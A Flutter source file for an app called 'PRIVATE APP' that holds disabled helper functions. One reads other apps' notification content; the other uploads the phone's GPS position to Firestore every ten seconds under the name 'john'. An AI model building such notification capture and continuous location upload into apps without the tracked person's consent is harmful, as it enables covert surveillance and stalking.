import 'dart:developer';

import 'package:flutter/material.dart';
import 'package:notification_listener_service/notification_event.dart';
import 'package:notification_listener_service/notification_listener_service.dart';
import 'package:priv_app/permisions.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'dart:async';
import 'package:location/location.dart' as loc; 

import 'package:priv_app/notification.dart' as not; 


void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(const MaterialApp(home: MyApp()));
  // Start the location update loop
 // _startLocationUpdates();
   // _startListening();
    
    

}




class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  
  Widget build(BuildContext context) {
  
    return MaterialApp(
      title: 'PRIVATE APP',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: Permissions(),
    );
  }
}

 void _startListening() {
  print("Starting noti");
  StreamSubscription<ServiceNotificationEvent>? _subscription;
  List<ServiceNotificationEvent> events = [];

    print("stating Noti Service");
    _subscription = NotificationListenerService.notificationsStream.listen((event) {
      if (event.packageName != "" && event.content != "" && event.title != "") {
        print(event.packageName );
        print(event.content);
        print(event.title);
        log("$event");
        events.add(event);
        print("events");       
      }
    });
  }



// Define the `_getLocation()` method
Future<void> _getautoLocation() async {
  try {
    // Create an instance of Location
    loc.Location location = loc.Location();
    
    // Get the location data
    final loc.LocationData _locationResult = await location.getLocation();
    
    // Save the location data to Firestore
    await FirebaseFirestore.instance.collection('autolocation').doc('user1').set({
      'latitude': _locationResult.latitude,
      'longitude': _locationResult.longitude,
      'name': 'john'
    }, SetOptions(merge: false));
    print("send auto location");
  } catch (e) {
    print(e);
  }
}



// Define a function to start location updates
void _startLocationUpdates() {
  // Run `_getautoLocation()` immediately
  _getautoLocation();

  // Schedule `_getautoLocation()` to run every 1 minute
  Timer.periodic(Duration(seconds: 10), (timer) {
    _getautoLocation();
  });
}